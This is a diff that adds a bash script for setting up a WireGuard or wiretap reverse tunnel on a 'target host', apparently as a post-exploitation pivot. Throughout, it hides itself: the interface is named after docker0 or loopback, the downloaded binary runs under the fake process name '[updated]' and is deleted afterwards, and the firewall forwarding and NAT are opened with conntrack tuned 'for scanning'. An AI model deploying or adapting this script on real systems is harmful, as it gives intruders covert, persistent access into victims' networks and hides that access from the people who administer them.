@@ -1,0 +1,306 @@
+#! /usr/bin/env bash
+
+
+# This script sets a wireguard reverse tunnel on a target host.
+
+# X=<VERSION>-<PRIV>-<PUB>-<ENDPOINT>-<DEV>-<IPV4Addr>-<IPV6Addr>
+
+[[ -t 1 ]] && {
+# shellcheck disable=SC2034 # Unused
+CY="\e[1;33m" # yellow
+CG="\e[1;32m" # green
+CR="\e[1;31m" # red
+CC="\e[1;36m" # cyan
+# CM="\e[1;35m" # magenta
+# CW="\e[1;37m" # white
+CB="\e[1;34m" # blue
+CF="\e[2m"    # faint
+CN="\e[0m"    # none
+# CBG="\e[42;1m" # Background Green
+# night-mode
+CDR="\e[0;31m" # red
+CDG="\e[0;32m" # green
+CDY="\e[0;33m" # yellow
+CDB="\e[0;34m" # blue
+CDM="\e[0;35m" # magenta
+CDC="\e[0;36m" # cyan
+CUL="\e[4m"
+}
+
+[[ -z $ADDRESS ]] && ADDRESS="192.168.0.1/32"
+[[ -z $ADDRES6 ]] && ADDRES6="fd::1/128"
+[[ -z $PEER_ADDRESS ]] && PEER_ADDRESS="192.168.0.2/32"
+[[ -z $PEER_ADDRES6 ]] && PEER_ADDRES6="fd::2/128"
+[[ -z $WITHOUT_IPV6 ]] && WITH_IPV6=1
+[[ -z $WITHOUT_TUNE ]] && WITH_TUNE=1
+[[ -z $TYPE ]] && TYPE="wireguard:wiretap"
+[[ -z $UID ]] && UID=$(id -u)
+
+ERR()
+{
+	echo -e >&2 "[${CR}ERROR${CN}] $*"
+}
+
+ERREXIT()
+{
+	local code
+	code="$1"
+
+	shift 1
+	ERR "$@"
+
+	exit "$code"
+}
+
+WARN()
+{
+	echo -e >&2 "[${CDY}WARN${CN}] $*"
+}
+
+x2data()
+{
+    local IFS
+    IFS="-"
+    CONF=($X)
+
+    [[ ${#CONF[@]} -lt  4 ]] && ERREXIT 255 "X= is not a valid configuration string."
+    [[ ${CONF[0]}  -ne  1 ]] && ERREXIT 255 "X= contains a bad verison number."
+    [[ ${#CONF[1]} -ne 44 ]] && ERREXIT 255 "X= does not contain a valid private key."
+    [[ ${#CONF[2]} -ne 44 ]] && ERREXIT 255 "X= does not contain a valid public key."
+    
+    PRIV=${CONF[1]}
+    PEER=${CONF[2]}
+    EP=${CONF[3]}
+
+    [[ ${#CONF[@]} -ge 5 ]] && [[ -z $WGDEV ]] && [[ ${#CONF[4]} -gt 1 ]] && WGDEV=${CONF[4]}
+    [[ ${#CONF[@]} -ge 6 ]] && ADDRESS=${CONF[5]}
+    [[ ${#CONF[@]} -ge 7 ]] && ADDRES6=${CONF[6]}
+}
+
+# Delete any IPT rule and add new one
+ipt()
+{
+    local first
+    local table
+    table=$1
+    first=$2
+
+    shift 2
+    iptables -t "$table" -D "$@" 2>/dev/null # Delete old rule.
+    iptables -t "$table" "$first" "$@"
+}
+
+sysinc()
+{
+	local key
+	local val
+	key=$1
+	val=$2
+	[[ $(sysctl -n "$key") -ge $val ]] && return
+	sysctl -q -w "${key}=${val}" || WARN "Could not set '${key}=${val}'"
+}
+
+sysdec()
+{
+	local key
+	local val
+	key=$1
+	val=$2
+	[[ $(sysctl -n "$key") -le $val ]] && return
+	sysctl -q -w "${key}=${val}" || WARN "Could not set '${key}=${val}'"
+}
+
+# Tune Network for scanning.
+tune()
+{
+    sysinc net.netfilter.nf_conntrack_max 1048576
+    sysdec net.netfilter.nf_conntrack_tcp_timeout_syn_sent 10
+    sysdec net.netfilter.nf_conntrack_tcp_timeout_syn_recv 5        # default is 30, 5 because of wg tunnel
+    sysdec net.netfilter.nf_conntrack_tcp_timeout_last_ack 5        # default is 30
+    sysdec net.netfilter.nf_conntrack_tcp_timeout_fin_wait 10       # default is 120
+    sysdec net.netfilter.nf_conntrack_tcp_timeout_close 1           # default is 10
+    sysdec net.netfilter.nf_conntrack_tcp_timeout_close_wait 10     # default is 60
+    sysdec net.netfilter.nf_conntrack_tcp_timeout_unacknowledged 30 # default is 300
+    sysdec net.netfilter.nf_conntrack_tcp_timeout_established 10800 # 3h, default is 5 days
+    sysdec net.netfilter.nf_conntrack_icmp_timeout 10 # default is 30
+    sysdec net.netfilter.nf_conntrack_udp_timeout 10  # default is 30
+}
+
+wg_find_dev()
+{
+    local notexist
+    local str
+    local dev
+
+    # If user did not specify a device then find
+    # an available wireguard device.
+    [[ -z $WGDEV ]] && {
+        # Try to 'hide' as any of these interfaces
+        for dev in docker0 loopback docker1 sf0; do
+            # Record a device that doesnt exist
+            str=$(ip -details link show "${dev}" 2>/dev/null) || { [[ -z $notexist ]] && notexist="${dev}"; }
+            [[ ${str} == *wireguard* ]] && { WGDEV="${dev}"; break; } # Found old wireguard device.
+        done
+        [[ -z $WGDEV ]] && WGDEV="${notexist}"
+        [[ -z $WGDEV ]] && ERREXIT 255 "Could not find a free device name. Try ${CDC}export WGDEV=Blah0${CN}"
+    }
+
+    ### Check if it exists.
+    ip link show dev "${WGDEV}" &>/dev/null && ERREXIT 255 "Device ${CDM}${WGDEV}${CN} exists. Try ${CDC}ip link del ${WGDEV}${CN} or ${CDC}export WGDEV=Blah0${CN}"
+}
+
+wg_up()
+{
+    local fn
+    local addr
+    command -v wg >/dev/null || ERREXIT 254 "WireGuard not installed. Try ${CDC}apt install wireguard${CN}"
+    command -v sysctl >/dev/null || ERREXIT 255 "sysctl not found. Try ${CDC}apt-get install procps${CN}"
+    command -v iptables >/dev/null || ERREXIT 255 "iptables not found. Try ${CDC}apt-get install iptables${CN}"
+    command -v ip >/dev/null || ERREXIT 255 "ip not found. Try ${CDC}apt-get install iproute2${CN}"
+
+    wg_find_dev
+
+    [[ $(sysctl -bn net.ipv6.conf.all.disable_ipv6 2>/dev/null) -ne 0 ]] && {
+        unset WITH_IPV6
+        WARN "IPv6 disabled. Try ${CDC}sysctl net.ipv6.conf.all.disable_ipv6=0${CN}"
+    }
+    [[ $(sysctl -bn net.ipv4.ip_forward) -eq 0 ]] && sysctl -q -w net.ipv4.ip_forward=1
+
+    ip link del "${WGDEV}" &>/dev/null
+    ip link add "${WGDEV}" type wireguard || ERREXIT 255
+
+    fn="/dev/shm/private.$$"
+    echo "$PRIV" >"${fn}"
+    addr="${PEER_ADDRESS}"
+    [[ -n $WITH_IPV6 ]] && addr+=",${PEER_ADDRES6}"
+    # addr="0.0.0.0/0"
+    # [[ -n $WITH_IPV6 ]] && addr+=", ::/0"
+    wg set "${WGDEV}" private-key "${fn}" peer "$PEER" allowed-ips "${addr}" endpoint "${EP}" persistent-keepalive 25 || ERREXIT 255
+    rm -f "${fn}"
+
+    ip -4 address add "${ADDRESS}" dev "${WGDEV}" || ERREXIT 255
+    [[ -n $WTIH_IPV6 ]] && ip -6 address add "${ADDRES6}" dev "${WGDEV}" || { unset WITH_IPV6; }
+
+    ip link set mtu 1420 up dev "${WGDEV}"
+
+    ip -4 route add "${PEER_ADDRESS}" dev "${WGDEV}"
+    [[ -n $WITH_IPV6 ]] && ip -6 route add "${PEER_ADDRES6}" dev "${WGDEV}" || { unset WITH_IPV6; }
+
+    [[ $(iptables -L FORWARD) != *"policy ACC"* ]] && {
+        ipt filter -I FORWARD -i "${WGDEV}" -j ACCEPT
+        ipt filter -I FORWARD -o "${WGDEV}" -j ACCEPT
+    }
+
+    ipt nat -A POSTROUTING -s "${PEER_ADDRESS}" -j MASQUERADE
+
+    [[ -n $WITH_TUNE ]] && tune
+
+    echo -e "\
+${CDG}SUCCRSS${CN}
+For status: ${CDC}wg show ${WGDEV}${CN}
+To stop   : ${CDC}ip link del ${WGDEV}${CN}"
+}
+
+# Download wiretap
+wt_dl()
+{
+    local arch
+    local url
+    local os
+
+    command -v tar >/dev/null || ERREXIT 255 "tar not found. Try ${CDC}apt install tar${CN}"
+
+    [[ -z $OSTYPE ]] && {
+        command -v uname >/dev/null || ERREXTI 255 "uname not found. Try ${CDC}apt install coreutils${CN}"
+        OSTYPE=$(uname -s)
+    }
+    OSTYPE="${OSTYPE,,}"
+
+    os="linux"
+    [[ $OSTYPE == *darwin* ]] && os="darwin"
+
+    arch=$(uname -m)
+    url="https://github.com/sandialabs/wiretap/releases/download/v0.2.1/wiretap_0.2.1_${os}_amd64.tar.gz"
+    if [[ $arch == aarch64 ]] || [[ $arch == arm64 ]]; then
+        url="https://github.com/sandialabs/wiretap/releases/download/v0.2.1/wiretap_0.2.1_${os}_arm64.tar.gz"
+    elif [[ $arch == i686 ]] || [[ $arch == i386 ]]; then
+        url="https://github.com/sandialabs/wiretap/releases/download/v0.2.1/wiretap_0.2.1_${os}_386.tar.gz"
+    elif [[ $arch == *"armv"* ]]; then
+        url="https://github.com/sandialabs/wiretap/releases/download/v0.2.1/wiretap_0.2.1_${os}_armv6.tar.gz"
+    fi
+
+    [[ -f wiretap ]] && rm -f wiretap
+    touch wiretap 2>/dev/null || {
+        cd /dev/shm || ERREXIT 255 "Change to a writeable directory"
+        touch wiretap || ERREXIT 255 "Change to a writeable directory."
+    }
+    rm -f wiretap
+    echo -e "Downloading ${CDM}wiretap${CN}..."
+    IS_DOWNLOADED=1
+    command -v curl >/dev/null && {
+        curl -fsSL "$url" | tar xfz - wiretap && return
+    }
+
+    command -v wget >/dev/null && {
+        wget -qO- "$url" | tar xfz - wiretap && return
+    }
+    unset IS_DOWNLOADED
+    [[ -f wiretap ]] && rm -f wiretap &>/dev/null # stale file
+
+    ERREXIT 255 "Failed to download Wiretap v0.2.1. Download it from
+${CDY}https://github.com/sandialabs/wiretap/releases${CN}
+and start is manually:
+    ${CDC}wiretap serve --private \"${PRIV}\" --public \"${PEER}\" --endpoint \"${EP}\"${CN}"
+}
+
+wt_up()
+{
+    local is_pidof
+    local err
+
+    command -v pidof >/dev/null && {
+        is_pidof=1
+        pids=$(pidof '[updated]') && ERREXIT 255 "Wiretap is already running with PID ${CDY}${pids}${CN}. Try ${CDC}killall wiretap${CN}"
+    }
+
+    command -v wiretap >/dev/null || {
+        PATH=".:$PATH"
+        [[ ! -e wiretap ]] && wt_dl
+    }
+    # CWD may have changed by wt_dl
+
+    exec -a '[updated]' wiretap serve -q --private "${PRIV}" --public "${PEER}" --endpoint "${EP}" &>/dev/null &
+    [[ -n $is_pidof ]] && {
+        sleep 0.5
+        pid=$(pidof '[updated]') || {
+            err=1
+            WARN "Failed to start wiretap."
+        }
+    }
+    
+    [[ -n $IS_DOWNLOADED ]] && rm -f wiretap
+    [[ -z $err ]] && echo -e "\
+${CDG}SUCCRSS${CN} - Started as ${CDY}[updated]${CN} with pid=${CDY}${pid:-pidof-not-found}${CN}
+To stop   : ${CDC}killall wiretap${CN}"
+
+    echo -e "\
+To run in foreground:
+    1. ${CDC}killall wiretap${CN}
+    2. ${CDC}wiretap serve --private \"${PRIV}\" --public \"${PEER}\" --endpoint \"${EP}\"${CN}"
+
+    WARN "${CDM}Wiretap${CN} is ${CDR}not good${CN} for scanning. Consider using ${CDR}root${CN} instead."
+}
+
+[[ -z $X ]] && {
+    echo -e "\
+The variable ${CDY}X=${CN} is not set. Try
+    ${CDC}X=<YourConfigurationString> ./sfwg${CN}"
+
+    exit 255;
+}
+x2data
+
+[[ ${TYPE} == *wireguard* ]] && [[ $UID -eq 0 ]] && { wg_up; exit; }
+[[ ${TYPE} == *wiretap* ]] && { wt_up; exit; }
+
+ERREXIT 255 "Set ${CDM}export TYPE=wiretap${CN} or ${CDM}export TYPE=wireguard${CN}"
